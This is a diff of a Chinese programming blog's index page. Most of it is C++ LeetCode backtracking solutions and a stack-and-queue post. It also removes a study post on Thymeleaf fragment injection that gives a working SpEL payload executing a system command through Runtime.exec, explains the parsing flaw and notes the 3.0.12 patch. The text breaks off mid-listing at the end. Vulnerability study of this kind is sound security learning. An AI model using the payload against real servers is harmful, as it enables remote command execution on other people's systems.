&#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">		</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isValid</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//检查是否有效</span></span><br><span class="line">        <span class="keyword">int</span> left = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> right = s.<span class="built_in">length</span>() - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (left &lt; right) &#123;</span><br><span class="line">            <span class="keyword">if</span> (s[left] != s[right]) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            left++;</span><br><span class="line">            right--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-
-<h4 id="93-复原-IP-地址"><a href="#93-复原-IP-地址" class="headerlink" title="93. 复原 IP 地址"></a><a target="_blank" rel="noopener" href="https://leetcode.cn/problems/restore-ip-addresses/">93. 复原 IP 地址</a></h4><p>本题算是上一题的升级版,有以下几点需要注意</p>
+      
+          <h1 id="栈和队列"><a href="#栈和队列" class="headerlink" title="栈和队列"></a>栈和队列</h1><h4 id="232-用栈实现队列"><a href="#232-用栈实现队列" class="headerlink" title="232. 用栈实现队列"></a><a target="_blank" rel="noopener" href="https://leetcode.cn/problems/implement-queue-using-stacks/">232. 用栈实现队列</a></h4><p>本题是一道模板题,创建两个栈in和out只需注意以下两点</p>
 <ol>
-<li>收获结果的条件,一定是最后一次切割在s末尾并且切割了4次才收获</li>
-<li>剪枝操作和上一题类似,都是在循环内检查本次切割是否合法,不合法则continue,舍弃当前的一个子树</li>
-<li>还有一个剪枝逻辑,就是当已经切割了3次,但是剩下的元素比3个多的时候,不可能组正常的ip地址,则直接break,一次性剪去后面的一堆子树</li>
-<li>substr函数的使用</li>
+<li>入元素入到in栈,出元素从out栈出</li>
+<li>in栈往out栈倒元素需要一次性倒完,out栈只有为空的时候才能进元素</li>
 </ol>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    string path;</span><br><span class="line">    vector&lt;string&gt; res;</span><br><span class="line">    <span class="keyword">int</span> pointCount = <span class="number">0</span>;</span><br><span class="line">    <span class="function">vector&lt;string&gt; <span class="title">restoreIpAddresses</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">backTracking</span>(s, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">backTracking</span><span class="params">(string s, <span class="keyword">int</span> startIndex)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (pointCount &gt; <span class="number">4</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (startIndex == s.<span class="built_in">length</span>() &amp;&amp; pointCount == <span class="number">4</span>) &#123;</span><br><span class="line">            <span class="comment">// 把多的一个点去掉</span></span><br><span class="line">            res.<span class="built_in">push_back</span>(path.<span class="built_in">substr</span>(<span class="number">0</span>, path.<span class="built_in">length</span>() - <span class="number">1</span>));</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = startIndex; i &lt; s.<span class="built_in">length</span>(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (pointCount == <span class="number">3</span> &amp;&amp; s.<span class="built_in">length</span>() - startIndex &gt; <span class="number">3</span>) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            string temp = s.<span class="built_in">substr</span>(startIndex, i - startIndex + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">isValid</span>(temp)) &#123;</span><br><span class="line">                <span class="keyword">int</span> len = path.<span class="built_in">length</span>();</span><br><span class="line">                path += temp + <span class="string">&quot;.&quot;</span>;</span><br><span class="line">                pointCount++;</span><br><span class="line">                <span class="built_in">backTracking</span>(s, i + <span class="number">1</span>);</span><br><span class="line">                pointCount--;</span><br><span class="line">                path = path.<span class="built_in">substr</span>(<span class="number">0</span>, len);</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isValid</span><span class="params">(string part)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (part.<span class="built_in">size</span>() &gt; <span class="number">3</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (part[<span class="number">0</span>] == <span class="string">&#x27;0&#x27;</span> &amp;&amp; part.<span class="built_in">size</span>() &gt; <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> temp = <span class="built_in">stoi</span>(part);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (temp &gt; <span class="number">255</span> || temp &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-
-
-
-<h4 id="78-子集"><a href="#78-子集" class="headerlink" title="78. 子集"></a><a target="_blank" rel="noopener" href="https://leetcode.cn/problems/subsets/">78. 子集</a></h4><p>这题跟前面不同的地方在于它收获结果不是在叶子结点,而是每一个树枝都收集</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; path;</span><br><span class="line">    vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; res;</span><br><span class="line">    vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">subsets</span>(vector&lt;<span class="keyword">int</span>&gt;&amp; nums) &#123;</span><br><span class="line">        <span class="built_in">backTracking</span>(nums, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">backTracking</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> startIndex)</span> </span>&#123;</span><br><span class="line">        res.<span class="built_in">push_back</span>(path);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = startIndex; i &lt; nums.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            path.<span class="built_in">push_back</span>(nums[i]);</span><br><span class="line">            <span class="built_in">backTracking</span>(nums, i + <span class="number">1</span>);</span><br><span class="line">            path.<span class="built_in">pop_back</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-
-
-
-<h4 id="90-子集-II"><a href="#90-子集-II" class="headerlink" title="90. 子集 II"></a><a target="_blank" rel="noopener" href="https://leetcode.cn/problems/subsets-ii/">90. 子集 II</a></h4><p>本题跟上一题多了一个树层去重的逻辑,先排序,排序好后数值相同的元素会相邻,同一层内,相邻元素的第一个的情况肯定会包含后面几个的情况</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; path;</span><br><span class="line">    vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; res;</span><br><span class="line">    vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">subsetsWithDup</span>(vector&lt;<span class="keyword">int</span>&gt;&amp; nums) &#123;</span><br><span class="line">        <span class="built_in">sort</span>(nums.<span class="built_in">begin</span>(), nums.<span class="built_in">end</span>());</span><br><span class="line">        <span class="built_in">backTracking</span>(nums, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">backTracking</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> startIndex)</span> </span>&#123;</span><br><span class="line">        res.<span class="built_in">push_back</span>(path);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = startIndex; i &lt; nums.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i &gt; startIndex &amp;&amp; nums[i] == nums[i - <span class="number">1</span>]) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            path.<span class="built_in">push_back</span>(nums[i]);</span><br><span class="line">            <span class="built_in">backTracking</span>(nums, i + <span class="number">1</span>);</span><br><span class="line">            path.<span class="built_in">pop_back</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-
-
-
-<h4 id="491-非递减子序列"><a href="#491-非递减子序列" class="headerlink" title="491. 非递减子序列"></a><a target="_blank" rel="noopener" href="https://leetcode.cn/problems/non-decreasing-subsequences/">491. 非递减子序列</a></h4><p>本题依然还是树层去重,但是它不是有序的数组,所以只能用set</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; path;</span><br><span class="line">    vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; res;</span><br><span class="line">    vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">findSubsequences</span>(vector&lt;<span class="keyword">int</span>&gt;&amp; nums) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">backTracking</span>(nums, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">backTracking</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> startIndex)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (path.<span class="built_in">size</span>() &gt;= <span class="number">2</span>) &#123;</span><br><span class="line">            res.<span class="built_in">push_back</span>(path);</span><br><span class="line">        &#125;</span><br><span class="line">        unordered_set&lt;<span class="keyword">int</span>&gt; st;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = startIndex; i &lt; nums.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (st.<span class="built_in">count</span>(nums[i])) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (path.<span class="built_in">size</span>() &gt; <span class="number">0</span> &amp;&amp; path[path.<span class="built_in">size</span>() - <span class="number">1</span>] &gt; nums[i]) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            st.<span class="built_in">insert</span>(nums[i]);</span><br><span class="line">            path.<span class="built_in">push_back</span>(nums[i]);</span><br><span class="line">            <span class="built_in">backTracking</span>(nums, i + <span class="number">1</span>);</span><br><span class="line">            path.<span class="built_in">pop_back</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-
-
-
-<h4 id="46-全排列"><a href="#46-全排列" class="headerlink" title="46. 全排列"></a><a target="_blank" rel="noopener" href="https://leetcode.cn/problems/permutations/">46. 全排列</a></h4><p>全排列就是典型的树枝去重,每一层都从头开始,但是上面层已经用过的元素不能再用</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; res;</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; path;</span><br><span class="line"></span><br><span class="line">    vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">permute</span>(vector&lt;<span class="keyword">int</span>&gt;&amp; nums) &#123;</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">used</span><span class="params">(nums.size(), <span class="number">0</span>)</span></span>;</span><br><span class="line">        <span class="built_in">backTracking</span>(nums, used);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">backTracking</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums, vector&lt;<span class="keyword">int</span>&gt;&amp; used)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (path.<span class="built_in">size</span>() == nums.<span class="built_in">size</span>()) &#123;</span><br><span class="line">            res.<span class="built_in">push_back</span>(path);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (used[i] != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            used[i] = <span class="number">1</span>;</span><br><span class="line">            path.<span class="built_in">push_back</span>(nums[i]);</span><br><span class="line">            <span class="built_in">backTracking</span>(nums, used);</span><br><span class="line">            path.<span class="built_in">pop_back</span>();</span><br><span class="line">            used[i] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-
-
-
-<h4 id="47-全排列-II"><a href="#47-全排列-II" class="headerlink" title="47. 全排列 II"></a><a target="_blank" rel="noopener" href="https://leetcode.cn/problems/permutations-ii/">47. 全排列 II</a></h4><p><strong>树枝去重+树层去重</strong></p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; res;</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; path;</span><br><span class="line"></span><br><span class="line">    vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">permuteUnique</span>(vector&lt;<span class="keyword">int</span>&gt;&amp; nums) &#123;</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">used</span><span class="params">(nums.size(), <span class="number">0</span>)</span></span>;</span><br><span class="line">        <span class="built_in">backTracking</span>(nums, used);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">backTracking</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums, vector&lt;<span class="keyword">int</span>&gt;&amp; used)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (path.<span class="built_in">size</span>() == nums.<span class="built_in">size</span>()) &#123;</span><br><span class="line">            res.<span class="built_in">push_back</span>(path);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        unordered_set&lt;<span class="keyword">int</span>&gt; st;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (used[i] != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(st.<span class="built_in">count</span>(nums[i]))&#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            st.<span class="built_in">insert</span>(nums[i]);</span><br><span class="line">            used[i] = <span class="number">1</span>;</span><br><span class="line">            path.<span class="built_in">push_back</span>(nums[i]);</span><br><span class="line">            <span class="built_in">backTracking</span>(nums, used);</span><br><span class="line">            path.<span class="built_in">pop_back</span>();</span><br><span class="line">            used[i] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-
-
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2024/09/28/%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -445,7 +866,7 @@
     <link itemprop="mainEntityOfPage" href="http://example.com/2022/12/16/thymeleaf%E7%AE%80%E5%8D%95%E5%85%A5%E9%97%A8/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/../images/avatar.PNG">
+      <meta itemprop="image" content="/../images/luoqixi.png">
       <meta itemprop="name" content="blueSatchel">
       <meta itemprop="description" content="">
     </span>
@@ -471,6 +892,13 @@
             </span>
 
           
+            <span id="/2022/12/16/thymeleaf%E7%AE%80%E5%8D%95%E5%85%A5%E9%97%A8/" class="post-meta-item leancloud_visitors" data-flag-title="thymeleaf简单入门" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
   
   <span class="post-meta-item">
     
@@ -495,51 +923,15 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h2 id="thymeleaf-fragment注入学习"><a href="#thymeleaf-fragment注入学习" class="headerlink" title="thymeleaf fragment注入学习"></a>thymeleaf fragment注入学习</h2><h3 id="与springBoot整合"><a href="#与springBoot整合" class="headerlink" title="与springBoot整合"></a>与springBoot整合</h3><h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><h5 id="1-导入依赖-版本可以不写-由springBoot统一管理"><a href="#1-导入依赖-版本可以不写-由springBoot统一管理" class="headerlink" title="1.导入依赖,版本可以不写,由springBoot统一管理"></a>1.导入依赖,版本可以不写,由springBoot统一管理</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-thymeleaf<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h5 id="2-在resources文件夹下面创建templates文件夹-一般所有模板均放在此文件夹下面"><a href="#2-在resources文件夹下面创建templates文件夹-一般所有模板均放在此文件夹下面" class="headerlink" title="2.在resources文件夹下面创建templates文件夹,一般所有模板均放在此文件夹下面"></a>2.在resources文件夹下面创建templates文件夹,一般所有模板均放在此文件夹下面</h5><p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20221104235220749.png" alt="image-20221104235220749"></p>
-<h5 id="3-配置模板文件路径的前后缀"><a href="#3-配置模板文件路径的前后缀" class="headerlink" title="3.配置模板文件路径的前后缀"></a>3.配置模板文件路径的前后缀</h5><p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20221104235352336.png" alt="image-20221104235352336"></p>
-<h5 id="4-配置打包后的静态资源存放路径-一般不需要写"><a href="#4-配置打包后的静态资源存放路径-一般不需要写" class="headerlink" title="4.配置打包后的静态资源存放路径,一般不需要写"></a>4.配置打包后的静态资源存放路径,一般不需要写</h5><p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20221104235458060.png" alt="image-20221104235458060"></p>
-<h5 id="5-编写代码"><a href="#5-编写代码" class="headerlink" title="5.编写代码"></a>5.编写代码</h5><p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20221104235637768.png" alt="image-20221104235637768"></p>
-<p>访问/index即可</p>
-<h4 id="注入原理"><a href="#注入原理" class="headerlink" title="注入原理"></a>注入原理</h4><p>该漏洞有版本限制,目前在springBoot2.2.0.RELEASE版本可以执行</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/veracode-research/spring-view-manipulation/">原理文章</a></p>
-<p>before loading the template from the filesystem, <a target="_blank" rel="noopener" href="https://github.com/thymeleaf/thymeleaf-spring/blob/74c4203bd5a2935ef5e571791c7f286e628b6c31/thymeleaf-spring3/src/main/java/org/thymeleaf/spring3/view/ThymeleafView.java">Spring ThymeleafView</a> class parses the template name as an expression:</p>
-<p>thymeleaf的fragment 功能会将::后面的字符串当成表达式解析</p>
-<p>fragement功能实现效果类似于vue动态路由传递一个参数过去让其选择性显示某一个div</p>
-<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20221105005907494.png" alt="image-20221105005907494"></p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">   <span class="comment">// By parsing it as a standard expression, we might profit from the expression cache</span></span><br><span class="line">   fragmentExpression = (FragmentExpression) parser.parseExpression(context, <span class="string">&quot;~&#123;&quot;</span> + viewTemplateName + <span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h5 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__$&#123;<span class="keyword">new</span> java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(<span class="string">&quot;id&quot;</span>).getInputStream()).next()&#125;__::.x</span><br></pre></td></tr></table></figure>
-
-
-
-<h4 id="原理简单跟进"><a href="#原理简单跟进" class="headerlink" title="原理简单跟进"></a>原理简单跟进</h4><p>spel表达式则需要再额外学习一下,这里先跟着研究一下Payload的简单构造原理</p>
-<h4 id=""><a href="#" class="headerlink" title=""></a><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20221105180720931.png" alt="image-20221105180720931"></h4><p>上面这段表明只有当模板名称包含::的时候,才能进入到parseExpression</p>
-<p>打断点跟进,发现在这个方法中会执行</p>
-<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20221105182319525.png" alt="image-20221105182319525"></p>
-<p>在这里通过正则匹配到__  __包裹的内容</p>
-<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20221105182858029.png" alt="image-20221105182858029"></p>
-<p>最后执行的时候会被还原成一个标准的spel表达式</p>
-<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20221105183035030.png" alt="image-20221105183035030"></p>
-<p><strong>以上逻辑仅限于Thymeleaf 3.0-3.0.12(不含3.0.12)</strong>     </p>
-<h2 id="Thymeleaf-3-0-12"><a href="#Thymeleaf-3-0-12" class="headerlink" title="Thymeleaf 3.0.12"></a>Thymeleaf 3.0.12</h2><p>在3.0.12版本发布了一个补丁</p>
-<p>其新增了一个这样的函数,当调用表达式的时候，会经过该函数的判断</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span 